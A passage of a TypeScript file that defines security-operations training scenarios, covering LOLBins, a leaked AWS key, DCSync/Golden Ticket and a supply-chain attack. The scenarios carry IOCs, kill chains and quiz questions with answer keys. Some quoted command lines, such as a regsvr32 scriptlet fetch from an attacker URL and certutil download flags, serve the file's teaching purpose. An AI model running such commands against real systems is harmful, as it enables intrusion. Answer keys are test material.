        prompt: "Sentinel counted 847 queries in 60 seconds against this host's 23-per-minute baseline. Why is that ratio a more durable detection than blocking the domain nexus-update-svc.xyz?",
        kind: "single",
        options: [
          { value: "volume_is_intrinsic", label: "Domains are cheap to rotate, but any DNS tunnel must send many queries to move data" },
          { value: "ttl_forces_repeats", label: "A very short record TTL forces the recursive resolver to repeat each lookup many times" },
          { value: "entropy_is_useless", label: "Subdomain entropy is the same for CDN hostnames, so only raw counts can be trusted" },
          { value: "only_rcode_logged", label: "A resolver can only measure the NXDOMAIN share of traffic, not the names requested" },
        ],
        answer: "volume_is_intrinsic",
        xp: 75,
        explanation:
          "Volume is a property of the technique, not of the infrastructure: a DNS label carries only tens of bytes, so moving anything meaningful forces thousands of queries. The attacker can register a new domain tomorrow, but cannot make the tunnel quiet. 'ttl_forces_repeats' confuses caching of *answers* with generation of *queries* — the client emits a new unique name per chunk, so TTL is irrelevant. 'entropy_is_useless' overstates a real caveat: CDN hostnames are indeed high-entropy, but this host's baseline entropy is 2.1 against encoded labels, so entropy still discriminates — it is just noisier than volume. 'only_rcode_logged' is false; the resolver logs the full QueryName, which is exactly where the encoded payload sits.",
      },
      {
        id: "dns_q3_encoding",
        prompt: "In evt_dns_05_exfil_start the label YWRtaW5AbmV4YWNvcnAuY29t decodes to admin@nexacorp.com. Why must the attacker chunk a file across hundreds of such queries instead of sending it in one?",
        kind: "single",
        options: [
          { value: "label_63_bytes", label: "A single DNS label is capped at 63 bytes, so one query carries well under 64 bytes" },
          { value: "base64_padding", label: "Base64 padding is illegal in DNS names, which caps every encoded label at only 32 bytes" },
          { value: "udp_512_cap", label: "A DNS query may not exceed 512 bytes total, which limits each label to 128 bytes" },
          { value: "txt_carries_only", label: "Only TXT records are permitted to carry encoded payloads, and TXT is response-only" },
        ],
        answer: "label_63_bytes",
        xp: 75,
        explanation:
          "The wire format decides it: a label is at most 63 bytes and the whole name at most 255, and base32 or base64 expands data before it is even placed there — so roughly 120 bytes of real data per query, hence 247 queries for a 29 KB file. 'base64_padding' starts from a true fact (the '=' character is not a legal hostname character, which is why tunnels strip it or prefer base32) but invents a 32-byte cap that does not exist. 'udp_512_cap' cites a real limit on the whole DNS message, not on a label, and EDNS0 raises it anyway — it is not the binding constraint here. 'txt_carries_only' has the direction backwards: outbound data rides in the query *name*, and TXT is used for the inbound command channel, as evt_dns_04_txt_c2 shows.",
      },
      {
        id: "dns_q4_attribution",
        prompt: "Select the TWO facts, each drawn from a different event, that tie the DNS tunnel specifically to the PowerShell download rather than to a browser or a misconfigured client.",
        kind: "multi",
        options: [
          { value: "image_path_matches", label: "Sysmon's Image field and the EDR record both name C:\\Windows\\Temp\\update.exe" },
          { value: "hash_matches", label: "The SHA256 of the downloaded file equals InitiatingProcessSHA256 on the query events" },
          { value: "corporate_resolver", label: "The queries were sent to the corporate resolver rather than to an external DNS server" },
          { value: "sequential_chunks", label: "The exfiltration labels are numbered in sequence from chunk 0001 through chunk 0247" },
        ],
        answer: ["image_path_matches", "hash_matches"],
        xp: 100,
        explanation:
          "Attribution needs a process identity carried across sources. evt_dns_01_download records the file written to C:\\Windows\\Temp\\update.exe and its SHA256; evt_dns_process_queries records the same path and the same hash as InitiatingProcess on the query traffic, and Sysmon's Image agrees — that is the link. 'corporate_resolver' is exactly what a browser does too: nearly all endpoints send DNS to the internal resolver, so it says nothing about which process. 'sequential_chunks' does prove the traffic is machine-generated exfiltration, but it comes from a SIEM correlation record that carries no process identity at all, so it cannot bind the tunnel to update.exe.",
      },
    ],
  };
}

// =========================================================================
// Scenario 9: Living-off-the-Land (LOLBins) — certutil → regsvr32 → Persistence
// =========================================================================

export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundle {
  const { title, events, T, MIN, payloadHash, certutilHash } = lolBinsScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: "pkg-mirror-eu.ru",                                  reputation: "malicious", tags: ["c2-domain", "certutil-download-source"] },
    { type: "domain", value: "cdn-winupd.ru",                                          reputation: "malicious", tags: ["c2-domain", "regsvr32-sct", "bitsadmin-download"] },
    { type: "sha256", value: payloadHash,                                             reputation: "malicious", tags: ["lolbins-payload", "dropped-module", "persistence-binary"] },
    { type: "sha256", value: certutilHash,                                            reputation: "malicious", tags: ["certutil-downloaded-payload"] },
    { type: "ip",     value: "185.220.101.55",                                        reputation: "malicious", tags: ["attacker-c2-ip", "regsvr32-sct-server", "bitsadmin-server"] },
    { type: "url",    value: "http://pkg-mirror-eu.ru/update.exe",                 reputation: "malicious", tags: ["lolbin-download-url"] },
    { type: "url",    value: "http://cdn-winupd.ru/tpl/upd.sct",                       reputation: "malicious", tags: ["squiblydoo-sct-url"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "TA-GHOSTSHELL (APT Group)",
    attack_kind: "lolbins_defense_evasion",
    briefing: "Microsoft Sentinel fired a rare-command-line detection on WS-HR-1133 (s.patel) at 11:05, and the firewall logged outbound HTTP from the same host to two external addresses in that window. A mail delivery to this user is also queued for review.",
    narrative: `A phishing email delivered a macro-enabled document to an HR workstation, spawning cmd.exe and beginning a 7-step LOLBin attack chain: certutil downloaded the initial payload (bypassing download controls since certutil is a trusted Windows binary), regsvr32 executed a remote COM scriptlet (Squiblydoo — bypasses AppLocker), mshta loaded a second-stage VBScript from URL, wmic performed process discovery, bitsadmin downloaded a persistence binary via a BITS job, rundll32 loaded an unsigned DLL from a user-writable path, and finally schtasks created a scheduled task, running in the user's context, that executes every 5 minutes. Every step used built-in, trusted Windows binaries to evade detection.`,
    learning_objectives: [
      "Identify the 7 most commonly abused LOLBins: certutil, regsvr32, mshta, wmic, bitsadmin, rundll32, schtasks",
      "Understand why each LOLBin is suspicious in these contexts (certutil downloading from internet, regsvr32 /i:<URL>, etc.)",
      "Recognize the Squiblydoo technique (regsvr32 COM scriptlet execution) and AppLocker bypass",
      "Detect LOLBin chain execution: suspicious parent-child process relationships",
      "Identify persistence via BITS jobs (survive reboots) and scheduled tasks (recurring execution)",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(-2 * MIN), phase: "Initial Access",              action: "Phishing email 'HR_Policy_Update.docm' delivered to s.patel (T1566.001)" },
      { ts: T(0),        phase: "Initial Access / Download",  action: "certutil.exe downloads malicious EXE from pkg-mirror-eu.ru (T1105)" },
      { ts: T(4 * MIN),  phase: "Defense Evasion",            action: "regsvr32.exe Squiblydoo — remote COM scriptlet bypasses AppLocker (T1218.010)" },
      { ts: T(7 * MIN),  phase: "Execution",                  action: "mshta.exe loads stage-2 VBScript from attacker URL (T1218.005)" },
      { ts: T(10 * MIN), phase: "Discovery",                  action: "wmic.exe enumerates all running processes (T1057)" },
      { ts: T(13 * MIN), phase: "Persistence / Download",     action: "bitsadmin.exe BITS job downloads persistence binary — survives reboot (T1197)" },
      { ts: T(16 * MIN), phase: "Defense Evasion",            action: "rundll32.exe loads unsigned attacker DLL from C:\\Users\\Public (T1218.011)" },
      { ts: T(20 * MIN), phase: "Persistence",                action: "schtasks.exe creates user-context task 'NexaCorpHealthCheck' — every 5 minutes (T1053.005)" },
    ],
    questions: [
      {
        id: "lol_q1_signed_binary",
        prompt: "Every executable in this chain ships with Windows and carries a valid Microsoft signature. Given that, what makes evt_lol_01_certutil malicious?",
        kind: "single",
        options: [
          { value: "flags_and_destination", label: "certutil ran -urlcache -split -f to pull an EXE from an external host over HTTP" },
          { value: "certutil_unsigned", label: "The certutil.exe image on this workstation was unsigned and failed its signature check" },
          { value: "hash_matches_payload", label: "certutil.exe's own SHA256 is identical to the SHA256 of the file it just downloaded" },
          { value: "wrong_folder", label: "certutil.exe was launched out of C:\\Users\\Public instead of its System32 location" },
        ],
        answer: "flags_and_destination",
        xp: 50,
        explanation:
          "A LOLBin is judged on behaviour, never on the file. certutil is a certificate utility; -urlcache -split -f turns it into a downloader, and the destination is an uncategorised .ru host — the command line and the network peer are the evidence. 'certutil_unsigned' contradicts the record and misses the lesson: the binary is the genuine signed OS component, which is precisely why it evaded download controls. 'hash_matches_payload' is impossible — one SHA256 identifies one file, and the event carries two distinct hashes, one for the certutil image and one for update.exe. 'wrong_folder' is contradicted by FolderPath, which reads C:\\Windows\\System32; a LOLBin runs from its normal home.",
      },
      {
        id: "lol_q2_squiblydoo",
        prompt: "evt_lol_02_regsvr32 runs: regsvr32 /s /u /i:http://cdn-winupd.ru/tpl/upd.sct scrobj.dll. Which statement explains why this defeats an AppLocker policy?",
        kind: "single",
        options: [
          { value: "signed_host_interprets", label: "An allow-listed signed binary interprets the remote scriptlet, so no new EXE is started" },
          { value: "u_flag_unregisters", label: "The /u flag unregisters the DLL, which also strips it out of the AppLocker rule set" },
          { value: "sct_not_covered", label: "AppLocker never evaluates .sct files at all, because it classifies scriptlets as image data" },
          { value: "http_is_exempt", label: "AppLocker only evaluates files on local disk, so anything fetched over HTTP is exempt" },
        ],
        answer: "signed_host_interprets",
        xp: 75,
        explanation:
          "This is Squiblydoo (T1218.010). AppLocker decides whether *a process image* may run; regsvr32.exe is a Microsoft binary that virtually every policy permits, and the attacker's code never becomes a process image — scrobj.dll fetches the scriptlet and executes it inside regsvr32. 'u_flag_unregisters' misreads the switch: /u with /i still invokes the scriptlet's unregister entry point, and AppLocker policy is machine configuration that regsvr32 cannot edit. 'sct_not_covered' is close to a real gap but wrong on mechanism — AppLocker does have script rules; they are bypassed because the scriptlet is never written to disk as a file for those rules to evaluate. 'http_is_exempt' invents an exemption; the location of the payload is irrelevant when the evaluated image is an approved one.",
      },
      {
        id: "lol_q3_parent_child",
        prompt: "Follow InitiatingProcessFileName and the parent PIDs across evt_lol_01 through evt_lol_07. Which reconstruction of the execution chain is supported by the records?",
        kind: "single",
        options: [
          { value: "regsvr_to_mshta_to_ps", label: "regsvr32 (5512) spawned mshta, whose PowerShell (6200) then parented wmic and bitsadmin" },
          { value: "cmd_parents_everything", label: "cmd.exe (4420) is the recorded direct parent of every process in the chain after certutil" },
          { value: "certutil_spawned_regsvr", label: "certutil (4440) spawned regsvr32 (5512), which is why the two share the same workstation" },
          { value: "schtasks_started_chain", label: "schtasks (7900) launched the earlier stages and then re-registered itself to run as SYSTEM" },
        ],
        answer: "regsvr_to_mshta_to_ps",
        xp: 100,
        explanation:
          "mshta's record names regsvr32.exe (PID 5512) as its initiating process, and its command line launches hidden PowerShell; wmic, bitsadmin, rundll32 and schtasks all then record powershell.exe PID 6200 as initiator. That is the chain. 'cmd_parents_everything' holds only for the first two steps — cmd.exe PID 4420 is the recorded parent of both certutil and regsvr32; from mshta onward the initiator is regsvr32, then PowerShell, not cmd. 'certutil_spawned_regsvr' asserts a link the data denies: regsvr32's parent PID is 4420 (cmd.exe), the same parent certutil has — not certutil's own PID 4440 — and sharing a host is not a parent-child relationship. 'schtasks_started_chain' is chronologically impossible — schtasks runs at T+20, twenty minutes after certutil, and a process cannot parent events that happened before it existed.",
      },
      {
        id: "lol_q4_persistence",
        prompt: "Select the TWO events that give the attacker execution surviving a reboot of WS-HR-1133, and be able to say why the others do not.",
        kind: "multi",
        options: [
          { value: "bits_job", label: "The BITS job NexaCorpUpdate resumes its transfer automatically after the machine restarts" },
          { value: "schtask_system", label: "The task NexaCorpHealthCheck re-runs the dropped binary every five minutes under the logged-on user" },
          { value: "rundll32_dllmain", label: "rundll32 loading srvhost.dll from C:\\Users\\Public keeps that DLL resident on the host" },
          { value: "wmic_enumeration", label: "wmic process list brief registers a permanent WMI event consumer on the workstation" },
        ],
        answer: ["bits_job", "schtask_system"],
        xp: 75,
        explanation:
          "BITS jobs are queued in a service that the OS restarts and resumes after reboot (T1197), and a scheduled task is re-registered from disk at boot — here running in the logged-on user's context every five minutes (T1053.005). Together they give both delivery and execution that outlive a restart. 'rundll32_dllmain' is defence evasion, not persistence: the DLL is loaded into a process, and when that process or the machine dies the execution dies with it — the file remaining on disk is storage, not a trigger. 'wmic_enumeration' confuses two very different wmic uses: process list brief is a read-only discovery query, whereas a permanent WMI subscription requires creating filter and consumer objects under root\\subscription, which appears nowhere in these logs.",
      },
    ],
  };
}

// =========================================================================
// Scenario 10: Leaked AWS Key → IAM Backdoor → S3 Data Theft
// =========================================================================

export function buildCloudKeyLeakS3ExfilScenario(scenarioId = "aws-key-leak-s3-exfil-2026"): ScenarioBundle {
  const { title, events, T, MIN, attackerIp, iamUser, leakedKey, backdoorUser, backdoorKey, s3Bucket, sampleObject } = cloudKeyLeakS3ExfilScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",   value: attackerIp,              reputation: "malicious",  tags: ["vps", "singapore", "leaked-key-use", "s3-download"] },
    { type: "user", value: backdoorUser,            reputation: "malicious",  tags: ["iam-user", "created-by-leaked-key", "persistence"] },
    { type: "user", value: iamUser,                 reputation: "suspicious", tags: ["ci-service-user", "leaked-credentials"] },
    { type: "host", value: s3Bucket,                reputation: "unknown",    tags: ["s3-bucket", "data-accessed"] },
    { type: "url",  value: "https://github.com/rocketstack-io/deploy-scripts/blob/76c770915494ad31afa9e44701a8f39a4924a4e3/scripts/deploy.sh", reputation: "suspicious", tags: ["credential-leak-source", "public-repo"] },
    { type: "email", value: "a.levy@rocketstack.io", reputation: "unknown",   tags: ["developer", "accidental-leak"] },
  ];

  const killchain = [
    { ts: T(-4 * MIN), phase: "Credential Exposure", action: `a.levy pushes scripts/deploy.sh containing ${iamUser}'s access key ${leakedKey} to the public repo rocketstack-io/deploy-scripts` },
    { ts: T(0),        phase: "Detection",           action: "GitHub secret scanning opens alert #42 for the AWS access key (validity: active)" },
    { ts: T(2 * MIN),  phase: "Initial Access",      action: `GetCallerIdentity with ${leakedKey} from ${attackerIp} (Singapore) — the key's first use outside the CI runner` },
    { ts: T(4 * MIN),  phase: "Discovery",           action: "ListBuckets, ListUsers, ListAttachedUserPolicies within a minute" },
    { ts: T(10 * MIN), phase: "Persistence",         action: `CreateUser ${backdoorUser}` },
    { ts: T(11 * MIN), phase: "Persistence",         action: `CreateAccessKey → ${backdoorKey} for ${backdoorUser}` },
    { ts: T(13 * MIN), phase: "Persistence",         action: `AttachUserPolicy AdministratorAccess → ${backdoorUser}` },
    { ts: T(16 * MIN), phase: "Detection",           action: `GuardDuty Persistence:IAMUser/AnomalousBehavior on ${iamUser}` },
    { ts: T(18 * MIN), phase: "Collection",          action: `GetObject run against ${s3Bucket} signed with ${backdoorKey} (first object ${sampleObject})` },
    { ts: T(31 * MIN), phase: "Detection",           action: "GuardDuty Exfiltration:S3/AnomalousBehavior — 1,284 GetObject calls in 11 minutes" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt: "Which row proves the leaked key was used by someone other than the CI pipeline?",
      kind: "single",
      options: [
        { value: "A", label: "evt_kl_01 — the GitHub secret-scanning alert itself" },
        { value: "B", label: `evt_kl_02 — GetCallerIdentity signed with ${leakedKey} from ${attackerIp}, not the CI runner's egress IP` },
        { value: "C", label: "evt_kl_00 — the PutObject to rocketstack-deploy-artifacts" },
        { value: "D", label: "evt_kl_06 — AttachUserPolicy, because only an attacker attaches AdministratorAccess" },
      ],
      answer: "B",
      xp: 50,
      explanation: "The GitHub alert (evt_kl_01) proves exposure, not use. The baseline (evt_kl_00) shows how the key is normally used: the CI runner's egress IP and an S3 upload. evt_kl_02 is the same access key id from a Singapore VPS address calling GetCallerIdentity — the first thing anyone runs with a key they just found, to learn whose it is. AttachUserPolicy comes later and is damning, but B is the first proof of outside use.",
    },
    {
      id: "q2",
      prompt: `Which access key signed the S3 GetObject calls (evt_kl_08), and how did that key come to exist?`,
      kind: "single",
      options: [
        { value: "A", label: `${leakedKey} — the leaked CI key, used directly against the bucket` },
        { value: "B", label: `${backdoorKey} — created for ${backdoorUser} by CreateAccessKey (evt_kl_05), called with the leaked key` },
        { value: "C", label: "No key — the bucket was made public and read anonymously" },
        { value: "D", label: "A temporary ASIA session key from AssumeRole" },
      ],
      answer: "B",
      xp: 75,
      explanation: `evt_kl_08's userIdentity is IAMUser ${backdoorUser} with accessKeyId ${backdoorKey}. That id appears exactly once before: in the responseElements of CreateAccessKey (evt_kl_05), whose caller was ${leakedKey} from ${attackerIp}. Pivoting on the key id is how you chain the S3 read back to the leak — and it is why deactivating only the leaked key would not have stopped the download.`,
    },
    {
      id: "q3",
      prompt: "Which FOUR actions are required to contain and scope this incident? (Select all that apply)",
      kind: "multi",
      options: [
        { value: "A", label: `Deactivate and then delete access key ${leakedKey}; issue the CI pipeline a new credential (preferably a role, not a long-term key)` },
        { value: "B", label: `Deactivate ${backdoorKey}, detach AdministratorAccess and delete the IAM user ${backdoorUser}` },
        { value: "C", label: `Search CloudTrail for every call by both keys and from ${attackerIp} (management AND S3 data events) to scope what was read or changed` },
        { value: "D", label: "Remove the key from the repo history and treat the commit as public forever — removal does not un-leak it" },
        { value: "E", label: "Delete the CloudTrail trail to stop the attacker reading it" },
        { value: "F", label: "Make the bucket public-read-blocked only — the IAM changes are noise" },
      ],
      answer: ["A", "B", "C", "D"],
      xp: 100,
      explanation: `(A) closes the original door; (B) closes the door the attacker built — ${backdoorUser} has AdministratorAccess and its own long-term key, so it survives (A). (C) scopes the breach: GuardDuty counted 1,284 GetObject calls, and the object keys in the S3 data events define what was taken (and therefore notification duties). (D) matters because the commit is public and scanned continuously; rotating is the fix, history rewriting is hygiene. (E) destroys your only evidence. (F) misreads the incident: the bucket was never public — the reads were signed by an IAM user the attacker created.`,
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Financially motivated actor scanning public repos for cloud keys",
    attack_kind: "cloud_credential_leak",
    briefing: "GitHub secret scanning opened an alert at 09:00 for an AWS access key in the public repo rocketstack-io/deploy-scripts. Since then GuardDuty has raised two findings on the same account. Scope the account.",
    narrative: `At 08:56, DevOps engineer a.levy pushed a deploy script to a public GitHub repository with the CI user's long-term access key embedded in it. GitHub's secret scanning flagged it four minutes later — but two minutes after that the key was already in use from a Singapore VPS: first GetCallerIdentity, then a quick look at the account's buckets and IAM users. Ten minutes in, the same key created a new IAM user, gave it its own access key and attached AdministratorAccess. From then on the leaked key was no longer needed: the new user's key read more than a thousand objects from the production customer-data bucket before GuardDuty's S3 finding fired. Your job: prove the key was used, follow the key ids from the leak to the bucket, and define containment that removes BOTH the leaked credential and the one the attacker built.`,
    learning_objectives: [
      "Tell exposure (a secret-scanning alert) from use (CloudTrail calls signed with that key from a new IP)",
      "Pivot on access key ids: CreateAccessKey responseElements → the key in later userIdentity blocks",
      "Recognise IAM persistence in AWS: CreateUser + CreateAccessKey + AttachUserPolicy",
      "Read S3 data events and GuardDuty S3 findings to scope what was taken",
      "Contain a leaked-key incident completely: both keys, the created user, and the scoping search",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events,
    iocs,
    killchain,
    questions,
  };
}

// =========================================================================
// Scenario 11: DCSync → Golden Ticket (Domain Dominance)
// =========================================================================

export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): ScenarioBundle {
  const { title, events, T, MIN, attackerIp, dc01, adminEmail, mimikatzHash, ntdsDitHash } = dcSyncScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",     value: attackerIp,                                      reputation: "malicious",  tags: ["external-infrastructure", "netherlands", "vps-hosting"] },
    { type: "user",   value: adminEmail,                                       reputation: "suspicious", tags: ["compromised-account", "it-admin", "stolen-credentials"] },
    { type: "host",   value: dc01,                                             reputation: "unknown", tags: ["patient-zero", "domain-controller", "dcsync-source"] },
    { type: "sha256", value: mimikatzHash,                                     reputation: "malicious",  tags: ["mimikatz", "credential-dumper", "hacktool"] },
    { type: "user",   value: "svc-monitoring-prod@nexacorp.com",               reputation: "malicious",  tags: ["shadow-admin", "backdoor-account", "domain-admins"] },
    { type: "sha256", value: ntdsDitHash,                                         reputation: "malicious",  tags: ["ntds-snapshot", "ad-database", "credential-exfil"] },
    { type: "host",   value: "C:\\Windows\\Temp\\ntds_snapshot_20260603.dit", reputation: "malicious",  tags: ["ntds-dit", "staged-exfil", "2.7gb-ad-database"] },
  ];

  const killchain = [
    { ts: T(0),        phase: "Initial Access",    action: "Attacker RDPs to DC01 from Netherlands IP using stolen it.admin credentials (T1021.001)" },
    { ts: T(3 * MIN),  phase: "Credential Access", action: "A renamed Mimikatz binary (wdhelper.exe) dropped and executed on DC01 — Defender detects but takes no action" },
    { ts: T(5 * MIN),  phase: "Defense Evasion",   action: "Windows Defender real-time protection disabled via registry (T1562.001)" },
    { ts: T(8 * MIN),  phase: "Credential Access", action: "DCSync attack — DS-Replication-Get-Changes + Get-Changes-All via Event 4662 (T1003.006)" },
    { ts: T(10 * MIN), phase: "Credential Access", action: "DCSync targeting krbtgt account — extracting Kerberos TGT signing key (T1003.006)" },
    { ts: T(13 * MIN), phase: "Credential Access", action: "Golden Ticket forged offline from the stolen krbtgt hash — a TGT the KDC never issued or recorded, then used to request a 4769 service ticket with no preceding 4768 (T1558.001)" },
    { ts: T(17 * MIN), phase: "Lateral Movement",  action: "Golden Ticket used to authenticate to DC02 directly from Netherlands IP (T1550.003)" },
    { ts: T(20 * MIN), phase: "Credential Access", action: "ntdsutil.exe creates NTDS.dit snapshot (2.7 GB) — entire AD password database staged (T1003.003)" },
    { ts: T(23 * MIN), phase: "Persistence",       action: "Shadow admin account svc-monitoring-prod created and added to Domain Admins (T1136.001)" },
    { ts: T(25 * MIN), phase: "Defense Evasion",   action: "Security event log cleared (Event 1102) — covering tracks on DC01 (T1070.001)" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q_dc_01",
      prompt: "Event ID 4662 appears with Properties {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} and {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2} on a Domain Controller, triggered by a non-DC user account. What does this indicate?",
      kind: "single",
      options: [
        { value: "dcsync",     label: "DCSync — a replication request used to extract password hashes without touching LSASS" },
        { value: "normal_rep", label: "Routine AD replication between two Domain Controllers using DRSUAPI GetNCChanges calls" },
        { value: "kerberoast", label: "Kerberoasting — service ticket requests with an RC4 downgrade for offline cracking" },
        { value: "ldap_enum",  label: "LDAP enumeration — BloodHound/SharpHound collecting domain objects and their ACLs" },
      ],
      answer: "dcsync",
      xp: 75,
      explanation: "GUIDs {1131f6aa} and {1131f6ab} are the specific extended rights for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All. When a non-DC user account (not ending in $) triggers Event 4662 with these GUIDs on the domain root object, it is a definitive DCSync attack indicator. Normal DC replication uses machine accounts (e.g., DC01$). Kerberoasting generates Event 4769, not 4662. LDAP enumeration generates Event 4662 on object reads but with different ObjectClass and AccessMask values.",
    },
    {
      id: "q_dc_02",
      prompt: "it.admin requests a service ticket (4769) from DC02, and a hunt across both domain controllers finds no 4768 for that account in the preceding 24 hours. What does that combination indicate, and why is it the tell?",
      kind: "single",
      options: [
        { value: "T1558.001", label: "A forged TGT is in play — it was minted offline from the krbtgt hash, so the KDC never issued one and no 4768 exists to find (T1558.001, Golden Ticket)" },
        { value: "T1550.002", label: "The account's NTLM hash is being replayed over SMB, which produces Kerberos service tickets without any prior interactive authentication (T1550.002, Pass-the-Hash)" },
        { value: "T1558.003", label: "A service account with an SPN is being roasted, and the TGS request is the harvest step whose ticket gets cracked offline afterwards (T1558.003, Kerberoasting)" },
        { value: "T1558.002", label: "A service ticket was forged directly using the target service account's own hash, which bypasses the KDC for that one service (T1558.002, Silver Ticket)" },
      ],
      answer: "T1558.001",
      xp: 75,
      explanation: "The missing 4768 IS the finding. Normal Kerberos is a two-step exchange: the client asks the KDC for a TGT (4768), then presents that TGT to request service tickets (4769). A Golden Ticket is forged offline from the krbtgt hash, so the attacker already holds a TGT the KDC never issued and skips the AS exchange entirely — producing a 4769 with nothing before it. That absence is what makes golden tickets hard: the ticket itself is cryptographically valid and looks entirely normal in isolation. The RC4 encryption (0x17) on a domain that has been AES-only since 2024 is the corroborating signal, because forging tools default to RC4 — it needs only the NTLM hash rather than the AES keys. Silver Ticket (T1558.002) forges a SERVICE ticket with the service account's hash and would show no 4769 either, since it skips the TGS exchange too — here we HAVE a 4769, so the KDC was involved and the forgery is upstream of it. Kerberoasting (T1558.003) is the reverse direction: it requests tickets in order to crack them, and requires a valid account to start from. Pass-the-Hash is NTLM, not Kerberos, and produces no ticket events at all.",
    },
    {
      id: "q_dc_03",
      prompt: "An analyst sees Event ID 1102 (Security audit log cleared) on a Domain Controller immediately after DCSync and NTDS.dit dump activity. What is the FIRST action the analyst should take?",
      kind: "single",
      options: [
        { value: "isolate",    label: "Isolate the Domain Controller and treat the entire domain as fully compromised" },
        { value: "email_user", label: "Send an email warning to the it.admin account holder to verify if they cleared the logs" },
        { value: "block_ip",   label: "Block the attacker's source IP at the perimeter firewall and continue monitoring" },
        { value: "wait",       label: "Wait for more evidence before escalating — log clearing may be routine maintenance" },
      ],
      answer: "isolate",
      xp: 50,
      explanation: "Event 1102 on a Domain Controller following confirmed credential theft (DCSync + NTDS dump) is a definitive indicator of a fully compromised domain. The attacker already holds the krbtgt hash and has forged Golden Tickets — blocking an IP or waiting for more evidence is useless because Golden Tickets allow authentication from any IP and survive password resets of normal accounts. The correct response is immediate DC isolation, emergency krbtgt password reset (twice, to invalidate all existing tickets), and escalation to a full domain recovery plan. Emailing the user is inappropriate given the confirmed attack chain.",
    },
    {
      id: "q_dc_04",
      prompt: "After the attacker clears the Security event log on DC01, which TWO methods would a threat hunter use to reconstruct the attack timeline?",
      kind: "multi",
      options: [
        { value: "siem_forwarding", label: "Pull forwarded events from the SIEM — events streamed before log clear are preserved in the SIEM index" },
        { value: "edr_telemetry",   label: "Query CrowdStrike EDR telemetry for ntdsutil.exe and wdhelper.exe process execution — EDR logs are independent of Windows Event Log" },
        { value: "fw_rules",        label: "Review firewall rule-change logs on the perimeter appliance — ACL modifications would show which internal hosts the attacker opened paths between" },
        { value: "backup_system",   label: "Restore the previous night's system-state backup of DC01 to a lab host and read the Security log from before the clear" },
      ],
      answer: ["siem_forwarding", "edr_telemetry"],
      xp: 100,
      explanation: "Event 1102 only clears the local Windows Security Event Log on the DC. It does NOT affect: (1) SIEM indexes — events already forwarded (via WEF/WEC or SIEM agent) are preserved in the SIEM independently of the local log. (2) EDR telemetry — CrowdStrike Falcon maintains its own process/file event stream that is completely separate from the Windows Event Log subsystem. Reviewing firewall rule changes is a valid investigation step but won't reconstruct the DC-side timeline. Restoring from backup would be a recovery action, not an investigative one — and modern backups won't contain deleted event logs in a recoverable forensic form.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT-IRONBEAR (nation-state, Russia nexus)",
    attack_kind: "dcsync_golden_ticket",
    briefing: "An interactive RDP logon for it.admin was recorded on DC01 from an external address at 01:15 — the first time this account has authenticated from that country. Windows Defender raised a tool detection on the same host three minutes later. Nothing was blocked.",
    narrative: `At 01:15 AM Israeli time, NexaCorp's IT admin account — compromised weeks earlier via a targeted spearphishing campaign — was used to RDP directly into the primary Domain Controller from an IP at a Netherlands VPS hosting provider. The attacker moved methodically: first launching Mimikatz — which Defender flagged but was configured not to block — then disabling Windows Defender via registry tamper and executing a DCSync attack using the legitimate DS-Replication-Get-Changes-All extended right. Within 10 minutes, the krbtgt account's NTLM hash was extracted — the domain's master Kerberos signing key. Using this hash, the attacker forged a Golden Ticket offline with a 10-year lifetime, granting unlimited, password-reset-resistant access to every service in the domain. The attacker then authenticated directly to the secondary DC using the forged ticket, ran ntdsutil to snapshot the entire Active Directory database (2.7 GB — every domain account's credentials), created a disguised shadow admin account svc-monitoring-prod, and finally cleared the Security event log to erase the evidence. Your job: trace the DCSync kill chain, identify the Golden Ticket indicators, and determine the correct incident response actions for a fully compromised Active Directory domain.`,
    learning_objectives: [
      "Identify DCSync attacks using Windows Event ID 4662 with DS-Replication-Get-Changes-All GUIDs",
      "Recognize Golden Ticket indicators: RC4 encryption (0x17) on an AES-only domain, and a 4769 service-ticket request with no preceding 4768 TGT",
      "Understand why krbtgt hash extraction enables long-term, password-reset-resistant domain persistence",
      "Detect shadow admin account creation and log clearing as post-exploitation cover-tracks techniques",
      "Know the correct incident response for a compromised Active Directory: DC isolation + double krbtgt reset",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events,
    iocs,
    killchain,
    questions,
  };
}

// =========================================================================
// Scenario 12: Supply Chain Attack — Malicious Vendor Update
// =========================================================================

export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): ScenarioBundle {
  const { title, events, T, MIN, attacker, victim, malDllHash } = supplyChainScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",     value: attacker.ip,          reputation: "malicious",  tags: ["external-infrastructure", "netherlands"] },
    { type: "ip",     value: attacker.relayIp,      reputation: "malicious",  tags: ["attacker-relay", "singapore"] },
    { type: "domain", value: attacker.c2Domain,     reputation: "malicious",  tags: ["c2", "fake-telemetry", "self-signed"] },
    { type: "sha256", value: malDllHash,             reputation: "malicious",  tags: ["trojanized-shared-object", "supply-chain", "netpulse"] },
    { type: "user",   value: victim.adminEmail,      reputation: "suspicious", tags: ["compromised-credentials", "devops"] },
    { type: "url",    value: `https://${attacker.c2Domain}/beacon`, reputation: "malicious", tags: ["c2-beacon"] },
  ];

  const killchain = [
    { ts: T(0),         phase: "Initial Access",    action: "Trojanized NetPulse v4.2.2 downloaded — legitimate signed package, malicious shared object embedded inside (T1195.002)" },
    { ts: T(2 * MIN),   phase: "Execution",         action: "Signed installer runs — drops malicious libnetpulse_core.so.2 to /lib/x86_64-linux-gnu/ (T1036.005)" },
    { ts: T(5 * MIN),   phase: "Execution",         action: "netpulse-agent spawns child from wrong path — hash mismatch vs. known-good (T1195.002)" },
